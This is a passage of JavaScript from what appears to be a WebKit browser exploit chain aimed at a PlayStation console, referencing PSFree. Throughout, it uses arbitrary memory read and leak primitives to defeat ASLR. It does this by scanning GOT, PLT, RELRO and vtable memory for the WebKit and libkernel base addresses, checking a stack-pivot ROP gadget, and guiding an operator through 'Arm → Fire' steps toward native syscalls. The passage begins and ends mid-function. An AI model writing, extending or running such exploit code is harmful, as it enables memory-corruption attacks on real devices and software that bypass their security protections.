    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("PIVOT-SKIP", "no webkitBase — Save bases first");
        return;
    }
    const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
    mark("PIVOT-CHECK", "G5="
        + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — HW +0x13ec77a"));
    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
    if (v.missing.length)
        mark("PIVOT-MISS", v.missing.join(", ") + " — tap a G5 button above");
    if (v.bad.length) {
        mark("PIVOT-BAD", v.bad.join(", ") + " — bytes mismatch at RVA");
        logPivotBadBytes(p, webkitBase, off, v.bad);
    }
    if (v.good.length)
        mark("PIVOT-OK", v.good.join(", "));
    pivotReady = v.ok;
    if (v.ok) {
        mark("PIVOT-READY", v.count + "/" + v.total + " (optional — skip, use Fire getpid)");
        state("pivot OK — optional", "ok");
    } else {
        state("pivot not ready — " + pivotNotReadyMsg(v), "warn");
    }
    setUi();
}

function captureNativeFnQuick(p, off) {
    try {
        const raw = sessionStorage.getItem("wk-nativeFn");
        if (raw) {
            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
            if (fn) return fn;
        }
    } catch (_) { }
    const cell = p.leakval(Math.expm1);
    return p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
}

function resolveLibkernelBase(p, off, webkitBase) {
    const r = resolveLibkernel(p, webkitBase, off, {
        log: mark,
        read8: read8p,
    });
    return r.ok ? r.lk : null;
}

let iatScanState = null;

function logLibkernelMissSummary(chunk, scanStateObj, webkitBase, nativeFn) {
    const st = scanStateObj || {};
    const ps = st.pltStats || {};
    const path = st.poopsLite ? "lite" : "full";
    const ff25 = chunk.ff25 != null ? chunk.ff25 : (ps.ff25 || 0);
    const gotHigh = chunk.gotHigh != null ? chunk.gotHigh : (ps.gotHigh || 0);
    const e8ext = chunk.e8ext != null ? chunk.e8ext : (ps.e8ext || 0);
    const ring = chunk.nearPages != null ? chunk.nearPages : (st.nearPages || 0);
    const leak = chunk.leakTried != null ? chunk.leakTried : (st.leakTried || 0);
    mark("LK-SUMMARY", "build=" + BUILD_ID + " path=" + path + " phase=" + (chunk.phase || "?")
        + " wk=" + webkitBase
        + " ff25=" + ff25 + " gotHigh=" + gotHigh + " e8ext=" + e8ext
        + " near=" + ring + " leak=" + leak
        + (chunk.dynTried != null ? " dyn=" + chunk.dynTried : "")
        + (chunk.refs ? " plt=" + chunk.refs : "")
        + (chunk.slots ? " got=" + chunk.slots : "")
        + (chunk.probes ? " stub=" + chunk.probes : ""));
    const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
    for (let ci = 0; ci < Math.min(cands.length, 6); ci++)
        mark("LK-GUESS", cands[ci].hex + " (" + cands[ci].why + ")");
    mark("LK-HINT", "Leak+vtable LK on rw — or cal 2e for EXT-PTR lines");
    if (stateEl) {
        stateEl.textContent = "libkernel miss — open cal, paste vtable ext ptr";
        stateEl.className = "bad";
    }
}

async function runShowLkHints() {
    if (!ready || busy) return;
    const { nativeFn, webkitBase } = basesFromSession(loadEffectiveOff());
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    showLibkernelGuesses(webkitBase, nativeFn, mark);
    mark("LK-HINT", "hints are NOT probed (OOM) — use Leak scan LK or cal paste");
    renderOut();
}

let leakScanState = null;

function runTryCalPtrs() {
    if (!ready || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    calLkCands = buildCalLkCandidates(p, off, webkitBase);
    if (calPtrIdx >= calLkCands.length) {
        calPtrIdx = 0;
        mark("LK-CAL-DONE", "cycle reset — tried all " + calLkCands.length + " bases");
        renderOut();
        return;
    }
    const c = calLkCands[calPtrIdx++];
    if (lines.length > 32) lines.splice(0, lines.length - 32);
    if (addrIn && c.base) addrIn.value = String(c.base);
    lkQuiet = true;
    mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + calLkCands.length
        + " " + c.label + " code=" + c.code + " magic=" + c.magic
        + " → base=" + c.base + " (" + c.note + ")");
    if (p && c.base) {
        const v = verifyLibkernelBase(p, c.base, off);
        if (v.ok && v.strong)
            mark("LK-CAL-VERIFY", "OK prologue + getpid stub @ +" + v.stubOff.toString(16));
        else if (v.ok)
            mark("LK-CAL-VERIFY", "weak — " + (v.warn || "prologue only"));
        else
            mark("LK-CAL-VERIFY", "BAD — " + (v.error || "?"));
    }
    mark("LK-HINT", "Verify lk or Force lk → Arm → Fire (no peek on code ptrs)");
    lkQuiet = false;
    if (outEl) {
        outEl.textContent = lines.join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
    state("base " + calPtrIdx + "/" + calLkCands.length + " — Verify or Force lk", "warn");
    try {
        crashLog.append("LK-CAL " + c.label + " base=" + c.base, "LK-CAL");
        crashLog.flushSync();
    } catch (_) { }
}

function runVerifyLk() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    const ptr = lkFromUi();
    if (!ptr) {
        mark("LK-SKIP", "hex box empty — Scan GOT lite or Load cal ptr first");
        return;
    }
    let v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
    let resolved = null;
    if (!v.ok) {
        resolved = resolveExtPtrSafe(p, ptr, off, webkitBase);
        if (resolved) {
            saveLibkernelSession(resolved.lk, resolved.iatRva);
            if (addrIn) addrIn.value = String(resolved.lk);
            v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
            mark("LK-RESOLVE-OK", String(ptr) + " → " + resolved.lk + " via " + resolved.via);
        }
    }
    const lkBase = resolved ? resolved.lk : ptr;
    if (v.ok && v.strong) {
        saveLibkernelSession(lkBase, null);
        mark("LK-VERIFY-OK", String(lkBase) + " stub+" + v.stubOff.toString(16) + " build=" + BUILD_ID);
        state("lk verified — Arm → Fire", "ok");
    } else if (v.ok) {
        saveLibkernelSession(lkBase, null);
        mark("LK-VERIFY-WARN", String(lkBase) + " " + (v.warn || "weak"));
        state("weak lk — Force lk → Arm → Fire", "warn");
    } else {
        mark("LK-VERIFY-BAD", v.error || "bad");
        state("verify failed — try next LK-EXT ptr", "bad");
    }
    renderOut();
    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + ptr, "LK-VERIFY");
    crashLog.flushSync();
}

function tryResolveExtList(p, off, webkitBase, ext, opts) {
    opts = opts || {};
    if (!p || !ext || !ext.length) return null;
    const hexes = [];
    for (let i = 0; i < ext.length; i++) {
        const h = extPtrHex(ext[i]);
        if (h) hexes.push(h);
    }
    if (!hexes.length) return null;

    if (webkitBase) {
        const near = tryWebkitNearLibkernel(p, webkitBase, off);
        if (near) return { hit: near, from: "wk-near", idx: -1 };
    }

    const deep = resolveMinExtDeepWalk(p, hexes, off, webkitBase, opts.minWalkPages || 128);
    if (deep && deep.lk) return { hit: deep, from: deep.from || "min", idx: -1 };
    if (deep && deep.miss) {
        mark("LK-MIN-WALK", "from=" + (deep.from || "?").slice(-9)
            + " pages=" + (deep.pages || 0)
            + (deep.magSeen && deep.magSeen.length ? " mag=" + deep.magSeen.join(",") : " mag=none"));
    }

    if (hexes.length >= 2) {
        const voteOpts = Object.assign({ walkPages: opts.walkPages || 64 }, opts);
        const voted = resolveExtListVote(p, hexes, off, webkitBase, voteOpts);
        if (voted) {
            return {
                hit: voted,
                from: "vote/" + (voted.vote != null ? voted.vote : "?"),
                idx: -1,
                voteRank: voteOpts._voteRank || null,
            };
        }
        if (voteOpts._voteRank && voteOpts._voteRank.length) {
            mark("LK-VOTE", voteOpts._voteRank.map(function (r) {
                return r.key.slice(-9) + "x" + r.count;
            }).join(" "));
        } else {
            mark("LK-VOTE-EMPTY", voteOpts._voteDiag || "no SCE/ELF hdr");
        }
    }

    for (let i = 0; i < hexes.length; i++) {
        const fn = parseAddr(hexes[i]);
        if (!fn) continue;
        const ak = resolveExtAlignedKError(p, fn, off, webkitBase);
        if (ak) return { hit: ak, from: hexes[i], idx: i };
    }

    for (let i = 0; i < ext.length; i++) {
        const fn = parseAddr(extPtrHex(ext[i]));
        if (!fn) continue;
        const hit = resolveExtPtrSafe(p, fn, off, webkitBase, opts);
        if (hit) return { hit, from: extPtrHex(ext[i]), idx: i };
    }
    return null;
}

function extPtrHex(entry) {
    if (!entry) return "";
    const raw = entry.ptr != null ? entry.ptr : entry;
    return String(raw).replace(/^0x/i, "").trim();
}

function saveExtPtrsSession(extList) {
    if (!extList || !extList.length) return;
    try {
        const arr = [];
        for (let i = 0; i < extList.length && i < 16; i++) {
            const hex = extPtrHex(extList[i]);
            if (!hex) continue;
            arr.push({
                label: extList[i].vt || ("vt[" + (extList[i].idx != null ? extList[i].idx : i) + "]"),
                ptr: hex,
            });
        }
        if (arr.length)
            sessionStorage.setItem(SS_CAL_EXT_PTRS, JSON.stringify(arr));
    } catch (_) { }
}

function finishFindLkChunk(chunk) {
    if (chunk.ok && chunk.lk) {
        findLkState = null;
        findLkAuto = false;
        findLkStop = false;
        if (addrIn) addrIn.value = String(chunk.lk);
        mark("LK-GOT-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
            + " build=" + BUILD_ID);
        const p = window.p;
        if (p) {
            const v = verifyLibkernelBase(p, chunk.lk, loadEffectiveOff());
            if (v.ok && v.strong)
                mark("LK-VERIFY-OK", "stub+" + v.stubOff.toString(16));
            else if (v.ok)
                mark("LK-VERIFY-WARN", v.warn || "weak");
        }
        state("Scan GOT OK — Force lk → Arm → Fire", "ok");
        crashLog.append("LK-GOT-OK " + chunk.lk, "LK-GOT");
        crashLog.flushSync();
        return true;
    }
    const isMiss = chunk.done && (
        chunk.phase === "got-scan-miss" || chunk.phase === "vt-miss");
    if (!isMiss) return false;

    findLkState = null;
    findLkAuto = false;
    findLkStop = false;

    const ext = Array.isArray(chunk.extList) ? chunk.extList : [];
    const extN = chunk.vtExt != null ? chunk.vtExt : ext.length;
    try {
        mark("LK-TRACE", "known=" + (chunk.known != null ? chunk.known : 0)
            + " cells=" + (chunk.cells != null ? chunk.cells : 0)
            + " vtables=" + (chunk.vtCount != null ? chunk.vtCount : 0)
            + " ext=" + extN
            + (chunk.tried != null ? " tried=" + chunk.tried : "")
            + (chunk.vtable ? " vtab=" + String(chunk.vtable).slice(0, 20) : ""));
        renderOut();
        crashLog.flushSync();

        if (chunk.cellDbg && chunk.cellDbg.length)
            mark("LK-CELL-DBG", String(chunk.cellDbg.join(" | ").slice(0, 240)));

        if (ext.length) {
            const hexes = [];
            for (let ei = 0; ei < ext.length && ei < 7; ei++) {
                const h = extPtrHex(ext[ei]);
                if (h) hexes.push(h);
            }
            mark("LK-EXT", "n=" + ext.length + (hexes.length ? " " + hexes.join(" ") : ""));
            saveExtPtrsSession(ext);

            const p = window.p;
            const off = loadEffectiveOff();
            const { webkitBase } = basesFromSession(off);
            const resolved = tryResolveExtList(p, off, webkitBase, ext, {
                walkPages: findLkPreset ? findLkPreset.walkPages : 64,
                minWalkPages: findLkPreset ? findLkPreset.minWalkPages : 128,
            });
            if (resolved) {
                saveLibkernelSession(resolved.hit.lk, resolved.hit.iatRva);
                if (addrIn) addrIn.value = String(resolved.hit.lk);
                mark("LK-RESOLVE-OK", resolved.from + " → " + resolved.hit.lk
                    + " via " + resolved.hit.via
                    + (resolved.hit.k__error != null
                        ? " (k__error=0x" + resolved.hit.k__error.toString(16) + ")" : "")
                    + " build=" + BUILD_ID);
                state("lk resolved — Force lk → Arm → Fire", "ok");
                renderOut();
                crashLog.flushSync();
                return true;
            }
            mark("LK-RESOLVE-MISS", "no lk from ext/wk-near/min-walk — paste hex → Verify lk");
            if (addrIn && hexes[0]) addrIn.value = hexes[0];
            mark("LK-HINT", "hex=ext ptr — Verify lk or Force lk");
        } else if (chunk.cells === 0) {
            mark("LK-HINT", "no cells — re-run Start");
        } else if ((chunk.vtCount || 0) === 0) {
            mark("LK-HINT", "no vtable — check LK-CELL-DBG");
        } else {
            mark("LK-HINT", "no ext ptrs in vtable slots");
        }

        mark("LK-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
    } catch (err) {
        mark("LK-FINISH-ERR", err.message || String(err));
    }

    state("Scan GOT miss — see LK-TRACE", "bad");
    renderOut();
    crashLog.flushSync();
    return true;
}

function stopFindLk() {
    findLkStop = true;
    psfreeAutoStop = true;
    state("Find lk stopping…", "warn");
}

/** ELF hdr → dynamic GOT → RELRO slots → textarea vtable (no PLT, no cal ptr). */
async function runFindLkAuto(preset) {
    if (!ready || !window.p) return;
    if (findLkAuto) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start first");
        return;
    }

    findLkPreset = preset || FIND_LK_LITE;
    findLkState = null;
    findLkAuto = true;
    findLkStop = false;
    busy = true;
    setUi();
    mark("LK-GOT", "auto " + findLkPreset.label + " build=" + BUILD_ID);
    renderOut();

    const opts = Object.assign({
        nativeFn,
        retain: retained,
        carrier: window._wkCarrier || null,
        pairCells: pairCellsForLk(),
        skipKnown: true,
        knownExtPtrs: [],
    }, findLkPreset);
    let loops = 0;
    const loopMax = 120;

    try {
        while (findLkAuto && !findLkStop && loops < loopMax) {
            const chunk = resolveLibkernelRelroChunk(p, webkitBase, off, findLkState, opts);
            findLkState = chunk.state;
            if (chunk.phase === "got-scan-start")
                mark("LK-GOT", "lite=safe-only known+vtable (no blind scan) build=" + BUILD_ID);
            else if (chunk.phase === "known-start")
                mark("LK-GOT", "known ext ptrs n=" + chunk.n);
            else if (chunk.phase === "known-skip" || chunk.phase === "known-done")
                mark("LK-GOT", (chunk.phase === "known-skip" ? "known skipped (OOM-safe)" : "known miss tried=" + (chunk.tried || 0))
                    + " — vtable scan");
            else if (chunk.phase === "vt-ready")
                mark("LK-GOT", "vtable " + chunk.vtable
                    + " n=" + (chunk.vtCount || 1) + " cells=" + (chunk.cells || "?")
                    + " " + (chunk.label || "")
                    + " — collect ext only"
                    + (chunk.cellDbg && chunk.cellDbg.length
                        ? " dbg=" + chunk.cellDbg.join(" | ").slice(0, 80) : ""));
            else if (chunk.phase === "vt-miss" && chunk.cellDbg && chunk.cellDbg.length)
                mark("LK-CELL-DBG", chunk.cellDbg.join(" | ").slice(0, 240));
            else if (chunk.phase === "vt-done")
                mark("LK-GOT", "vtable done ext=" + (chunk.ext || 0)
                    + " cells=" + (chunk.cells != null ? chunk.cells : "?")
                    + " n=" + (chunk.vtCount != null ? chunk.vtCount : "?")
                    + (chunk.error ? " err=" + chunk.error : "")
                    + " — abs RELRO");
            else if (chunk.phase === "abs-start")
                mark("LK-GOT", "abs RELRO " + chunk.from + "…" + chunk.to);
            else if (chunk.phase === "abs-done")
                mark("LK-GOT", "abs miss tried=" + (chunk.tried || 0)
                    + " — nearlk ±" + (findLkPreset.nearRadius || 0).toString(16));
            else if (chunk.phase === "nearlk-start")
                mark("LK-GOT", "nearlk hunt libkernel.sprx");
            else if (chunk.phase === "nearlk-done")
                mark("LK-GOT", "nearlk miss pages=" + (chunk.pages || 0)
                    + " magic=" + (chunk.hits || 0) + " — below-webkit");
            else if (chunk.phase === "below-done")
                mark("LK-GOT", "below miss pages=" + (chunk.pages || 0) + " — ELF hdr");
            else if (chunk.phase === "hdr-ok")
                mark("LK-GOT", "ELF hdr " + chunk.hdr + " — dynamic GOT");
            else if (chunk.phase === "hdr-skip")
                mark("LK-GOT", "no ELF hdr — skip webkit+RVA RELRO");
            else if (chunk.phase === "dyn-start")
                mark("LK-GOT", "dyn GOT inCap=" + chunk.slots + "/" + chunk.total);
            else if (chunk.phase === "dyn-done")
                mark("LK-GOT", "dyn miss — ELF RELRO (hdr-relative)");
            else if (chunk.phase === "relro-start")
                mark("LK-GOT", "RELRO " + chunk.span);
            else if (chunk.phase === "hdr" || chunk.phase === "dyn" || chunk.phase === "relro"
                || chunk.phase === "vt" || chunk.phase === "abs" || chunk.phase === "nearlk"
                || chunk.phase === "below")
                state("Scan GOT " + findLkPreset.label + " " + chunk.phase
                    + (chunk.cursor != null ? " @" + chunk.cursor.toString(16) : "")
                    + (chunk.at != null ? " @" + chunk.at : "")
                    + (chunk.tried != null ? " tried=" + chunk.tried : "")
                    + (chunk.pages != null ? " pages=" + chunk.pages : ""), "warn");
            if (chunk.done && finishFindLkChunk(chunk)) {
                renderOut();
                return;
            }
            loops++;
            if (loops % 4 === 0) {
                mark("LK-GOT", findLkPreset.label + " " + (chunk.phase || "?")
                    + (chunk.tried != null ? " tried=" + chunk.tried : ""));
                crashLog.flushSync();
                renderOut();
            }
            await new Promise(function (r) { setTimeout(r, findLkPreset.lite ? 48 : 24); });
        }
        if (loops >= loopMax)
            mark("LK-GOT-ABORT", "loop cap " + loopMax + " — partial, re-tap Scan GOT lite");
        if (findLkStop)
            mark("LK-FIND", "stopped");
    } catch (err) {
        mark("LK-FIND-FAIL", err.message || String(err));
        if (findLkState)
            mark("LK-FIND-PARTIAL", formatPsfreeStats(findLkState));
    } finally {
        findLkAuto = false;
        findLkStop = false;
        findLkPreset = null;
        busy = false;
        setUi();
        renderOut();
    }
}

function runGuessLk() {
    if (!ready || busy) return;
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start first");
        return;
    }
    const cands = estimateLibkernelCandidates(webkitBase, null);
    if (!cands.length) {
        mark("LK-SKIP", "no wk-relative guesses");
        return;
    }
    if (guessLkIdx >= cands.length) guessLkIdx = 0;
    const c = cands[guessLkIdx++];
    const hex = c.hex.replace(/^0x/i, "");
    if (addrIn) addrIn.value = hex;
    mark("LK-GUESS", c.hex + " (" + c.why + ") 0 reads — Force lk → Arm → Fire");
    state("wk guess " + guessLkIdx + "/" + cands.length, "warn");
    renderOut();
}

function finishPsfreeChunk(chunk) {
    if (chunk.ok && chunk.lk) {
        psfreePltState = null;
        psfreeAutoScan = false;
        psfreeAutoStop = false;
        if (addrIn) addrIn.value = String(chunk.lk);
        mark("LK-PSFREE-OK", chunk.source + " → " + chunk.lk
            + " plt+0x" + chunk.pltRva.toString(16)
            + (chunk.stubOk ? " stub20=OK" : "")
            + " build=" + BUILD_ID);
        state("PSFree lk OK — Force lk → Arm → Fire", "ok");
        crashLog.append("LK-PSFREE-OK " + chunk.lk + " plt=" + chunk.pltRva, "LK-PSFREE");
        crashLog.flushSync();
        return true;
    }
    if (chunk.done && !chunk.ok) {
        psfreePltState = null;
        psfreeAutoScan = false;
        psfreeAutoStop = false;
        const miss = (chunk.error || "no PLT hit tried=" + (chunk.tried || 0))
            + " build=" + BUILD_ID;
        mark("LK-PSFREE-MISS", miss);
        if (chunk.probe && chunk.probe.samples)
            mark("LK-PSFREE-PROBE", chunk.probe.samples);
        state("PSFree miss — see LK-PSFREE-MISS in log", "bad");
        crashLog.append(miss, "LK-PSFREE");
        if (chunk.probe) crashLog.append("PROBE " + chunk.probe.samples, "LK-PSFREE");
        crashLog.flushSync();
        return true;
    }
    return false;
}

function logPsfreeProbe(probe, rangeText) {
    if (!probe) return;
    mark("LK-PSFREE-PROBE", "build=" + BUILD_ID
        + (probe.poops ? " poops=1" : "")
        + " islands=" + (probe.ranges || 0));
    if (rangeText)
        mark("LK-PSFREE-PROBE", rangeText);
    mark("LK-PSFREE-PROBE", probe.sanity
        + " rdOk=" + (probe.rdOk || 0) + " rdFail=" + (probe.rdFail || 0)
        + " ff25sample=" + (probe.stubs || 0));
    if (probe.samples)
        mark("LK-PSFREE-PROBE", probe.samples);
    if (probe.stubs === 0 && probe.rdOk >= 3)
        mark("LK-PSFREE-HINT", "no ff25/15 in low sample — poops may lack PLT stubs; use cal Force lk");
    crashLog.append("PROBE " + probe.sanity + " stubs=" + probe.stubs
        + " " + (rangeText || ""), "LK-PSFREE");
}

function stopPsfreeScan() {
    psfreeAutoStop = true;
    state("PSFree stopping…", "warn");
}

/** Auto PSFree PLT scan — preset controls batch size and scan cap (no URL params). */
async function runPsfreeLkAuto(preset) {
    if (!ready || !window.p) return;
    if (psfreeAutoScan) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start first");
        return;
    }

    psfreePreset = preset || PSFREE_LITE;
    psfreePltState = null;
    psfreeAutoScan = true;
    psfreeAutoStop = false;
    busy = true;
    setUi();
    mark("LK-PSFREE", "auto " + psfreePreset.label
        + " reads=" + psfreePreset.maxReads
        + " cluster=1 build=" + BUILD_ID);
    renderOut();

    const batchOpts = {
        maxReads: psfreePreset.maxReads,
        cluster: psfreePreset.cluster !== false,
    };
    let loops = 0;

    try {
        while (psfreeAutoScan && !psfreeAutoStop) {
            let inner = 0;
            while (inner < psfreePreset.yieldBatches && !psfreeAutoStop) {
                const chunk = tryPsfreePltBatch(p, webkitBase, off, psfreePltState, batchOpts);
                psfreePltState = chunk.state;
                if (chunk.phase === "probe" && chunk.probe) {
                    logPsfreeProbe(chunk.probe, chunk.rangeText);
                    if (chunk.rangeTag)
                        mark("LK-PSFREE", "START island " + chunk.rangeTag
                            + " +0x" + chunk.cursor.toString(16));
                    renderOut();
                }
                if (chunk.phase === "range" && chunk.rangeTag) {
                    mark("LK-PSFREE", "JUMP island " + chunk.rangeTag
                        + " +0x" + chunk.cursor.toString(16)
                        + " stubs=" + (chunk.stubsSeen || 0));
                    crashLog.append("JUMP " + chunk.rangeTag + " +0x"
                        + chunk.cursor.toString(16), "LK-PSFREE");
                    crashLog.flushSync();
                }
                if (finishPsfreeChunk(chunk)) {
                    renderOut();
                    return;
                }
                inner++;
                loops++;
            }
            const cur = psfreePltState;
            const cursor = cur ? cur.cursor : 0;
            const tried = cur ? cur.tried : 0;
            const stubs = cur ? (cur.stubsSeen || 0) : 0;
            const fnExt = cur ? (cur.fnExt || 0) : 0;
            const rng = cur ? (cur.rangeTag || "?") : "?";
            if (loops % 2 === 0) {
                state("PSFree " + psfreePreset.label + " " + rng + " +0x"
                    + cursor.toString(16) + " stubs=" + stubs, "warn");
                mark("LK-PSFREE", psfreePreset.label + " " + rng + " +0x"
                    + cursor.toString(16) + " tried=" + tried + " stubs=" + stubs
                    + " fnExt=" + fnExt);
                crashLog.append("PROG " + rng + " +0x" + cursor.toString(16)
                    + " stubs=" + stubs + " tried=" + tried, "LK-PSFREE");
                crashLog.flushSync();
                renderOut();
            }
            await new Promise(function (r) { setTimeout(r, 1); });
        }
        if (psfreeAutoStop) {
            mark("LK-PSFREE", "stopped @" + (psfreePltState
                ? "+0x" + psfreePltState.cursor.toString(16) : "?")
                + " tried=" + (psfreePltState ? psfreePltState.tried : 0));
            state("PSFree stopped", "warn");
        }
    } catch (err) {
        mark("LK-PSFREE-FAIL", err.message || String(err));
        if (psfreePltState)
            mark("LK-PSFREE-PARTIAL", formatPsfreeStats(psfreePltState)
                + " @+0x" + psfreePltState.cursor.toString(16));
        state("PSFree error/OOM — see LK-PSFREE-PARTIAL", "bad");
    } finally {
        if (psfreePltState && psfreeAutoScan) {
            crashLog.append("PARTIAL " + formatPsfreeStats(psfreePltState)
                + " @+0x" + psfreePltState.cursor.toString(16), "LK-PSFREE");
            crashLog.flushSync();
        }
        psfreeAutoScan = false;
        psfreeAutoStop = false;
        psfreePreset = null;
        busy = false;
        setUi();
        renderOut();
    }
}

async function runLeakLkScan() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    busy = true;
    setUi();
    leakScanState = null;
    mark("LK-LEAK", "build=" + BUILD_ID + " — PSFree vtable[0..47] + heap slots");
    scanState("leak scan…");
    let ticks = 0;
    try {
        while (ticks++ < 8000) {
            const chunk = scanLibkernelLeakChunk(p, webkitBase, off, leakScanState, retained);
            leakScanState = chunk.state;
            if (chunk.phase === "leak-start")
                mark("LK-LEAK", "vtable+heap targets=" + chunk.targets);
            else if (chunk.phase === "leak")
                scanState("leak tried=" + chunk.tried);
            if (chunk.done && chunk.lk) {
                mark("LK-OK", chunk.lk + " (" + (chunk.source || "leak") + ")");
                state("libkernel leak OK", "ok");
                break;
            }
            if (chunk.done) {
                const ext = chunk.extList || (leakScanState && leakScanState.extList) || [];
                for (let ei = 0; ei < ext.length; ei++)
                    mark("LK-EXT", ext[ei].source + " → " + ext[ei].ptr);
                mark("LK-LEAK-MISS", "tried=" + (chunk.tried || 0)
                    + " ext=" + ext.length + " — paste LK-EXT into hex → Paste libkernel");
                state("leak miss — paste LK-EXT ptr", "bad");
                break;
            }
            if ((ticks & 15) === 0)
                await new Promise(r => setTimeout(r, 2));
            else
                await new Promise(r => setTimeout(r, 0));
        }
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("leak scan error", "bad");
    } finally {
        busy = false;
        leakScanState = null;
        setUi();
        renderOut();
        crashLog.flushSync();
    }
}

async function runProbeLkGuesses() {
    return runShowLkHints();
}

async function runScanIat() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    if (iatScanState && !iatScanState.done) {
        iatScanState = null;
        mark("LK-STOP", "libkernel scan cancelled");
        return;
    }
    busy = true;
    setUi();
    iatScanState = null;
    mark("LK-SCAN", "build=" + BUILD_ID + " — poops lite or dyn→elf full path");
    const dynProbe = diagnoseWebkitDynamic(p, webkitBase, off, { deep: false });
    mark("LK-PROBE", dynProbe.reason
        + " kind=" + (dynProbe.kind || "?")
        + (dynProbe.poops ? " poops=1" : "")
        + " hint=" + dynProbe.hint
        + (dynProbe.elfHdr ? " elfHdr=" + dynProbe.elfHdr : "")
        + " magic=" + dynProbe.magic
        + (dynProbe.header ? " hdr=" + dynProbe.header : "")
        + (dynProbe.total != null ? " got=" + dynProbe.inCap + "/" + dynProbe.total : "")
        + (dynProbe.jmprel ? " jmprel=" + dynProbe.jmprel : "")
        + (dynProbe.pltgot ? " pltgot=" + dynProbe.pltgot : "")
        + (dynProbe.minRva ? " rva=" + dynProbe.minRva + ".." + dynProbe.maxRva : "")
        + " cap=" + dynProbe.cap);
    scanState("libkernel scan…");
    let ticks = 0;
    const maxTicks = 80000;
    const scanOpts = { nativeFn, log: mark, retain: retained };
    try {
        while (ticks++ < maxTicks) {
            const chunk = scanLibkernelChunk(p, webkitBase, off, iatScanState, scanOpts);
            iatScanState = chunk.state;
            if (chunk.phase === "lite-start")
                mark("LK-LITE", "poops path build=" + BUILD_ID
                    + " — PLT→nearlk→leak (no blind reads)");
            else if (chunk.phase === "nearlk-next")
                mark("LK-NEAR", "PLT miss ff25=" + (chunk.ff25 || 0)
                    + " gotHigh=" + (chunk.gotHigh || 0)
                    + " e8ext=" + (chunk.e8ext || 0)
                    + " — hunting libkernel ±32MB");
            else if (chunk.phase === "nearlk-start")
                mark("LK-NEAR", "scan ±32MB for libkernel.sprx");
            else if (chunk.phase === "nearlk" || chunk.phase === "nearlk-anchor")
                scanState("nearlk a#" + (chunk.anchor || 0) + " @" + chunk.at
                    + " pages=" + chunk.pages + " magic=" + (chunk.hits || 0));
            else if (chunk.phase === "leak-next")
                mark("LK-LEAK", "nearlk miss — heap leakval scan (OOM-safe)");
            else if (chunk.phase === "leak-start")
                mark("LK-LEAK", "scan leakval slots n=" + chunk.targets);
            else if (chunk.phase === "leak")
                scanState("leak tried=" + chunk.tried);
            else if (chunk.phase === "lite-miss")
                logLibkernelMissSummary(chunk, iatScanState, webkitBase, nativeFn);
            else if (chunk.phase === "dyn-start")
                mark("LK-DYN", "inCap " + chunk.slots + "/" + chunk.total
                    + " jmprel=+0x" + (chunk.jmprel || 0).toString(16)
                    + " pltgot=+0x" + (chunk.pltgot || 0).toString(16));
            else if (chunk.phase === "dyn-done") {
                const d = chunk.detail || {};
                mark("LK-DYN", (chunk.prev || "?") + ": " + (d.reason || "?")
                    + (chunk.dynTotal ? " got=" + (chunk.dynSlots || 0) + "/" + chunk.dynTotal : "")
                    + (d.loadBase ? " loadBase=" + d.loadBase : "")
                    + (d.magic ? " magic=" + d.magic : "")
                    + (d.jmprel ? " jmprel=" + d.jmprel : "")
                    + (d.pltgot ? " pltgot=" + d.pltgot : "")
                    + (d.minRva ? " rva=" + d.minRva + ".." + d.maxRva : "")
                    + " cap=" + (d.cap || "?"));
            } else if (chunk.phase === "rwptr-start")
                mark("LK-RWPTR", "scan mapped RW segments n=" + chunk.ranges);
            else if (chunk.phase === "rwptr" || chunk.phase === "rwptr-region")
                scanState("RW ptr +0x" + chunk.cursor.toString(16)
                    + " tried=" + chunk.tried);
            else if (chunk.phase === "elf-next")
                mark("LK-ELF", "rwptr miss tried=" + (chunk.rwptrTried || 0) + " — ELF hunt");
            else if (chunk.phase === "dyn-bad")
                mark("LK-DYN", "PT_DYNAMIC parse failed — ELF hunt");
            else if (chunk.phase === "dyn-empty")
                mark("LK-DYN", "no inCap GOT slots — ELF hunt");
            else if (chunk.phase === "dyn")
                scanState("dyn GOT " + chunk.idx + "/" + chunk.total
                    + " tried=" + chunk.tried);
            else if (chunk.phase === "elf-start")
                mark("LK-ELF", "scanning ±64MB for ELF modules");
            else if (chunk.phase === "elf-anchor")
                mark("LK-ELF", "anchor#" + chunk.anchor + " modules=" + chunk.modules);
            else if (chunk.phase === "elf")
                scanState("ELF @" + chunk.at + " pages=" + chunk.pages
                    + " modules=" + chunk.modules);
            else if (chunk.phase === "elf-score")
